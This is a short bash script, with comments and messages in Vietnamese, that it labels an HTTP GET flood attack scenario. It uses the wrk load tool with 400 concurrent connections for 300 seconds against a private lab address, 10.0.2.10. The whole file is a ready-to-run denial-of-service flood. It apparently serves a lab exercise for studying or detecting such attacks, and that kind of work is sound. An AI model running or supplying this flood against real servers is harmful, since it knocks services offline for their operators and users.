
#!/bin/bash
# Kich ban tan cong HTTP GET Flood
VICTIM=10.0.2.10
DURATION=300

echo "Bat dau HTTP Flood vao $VICTIM trong $DURATION giay..."
timeout $DURATION wrk -t4 -c400 -d300s http://$VICTIM/
echo "Hoan tat tan cong HTTP Flood!"

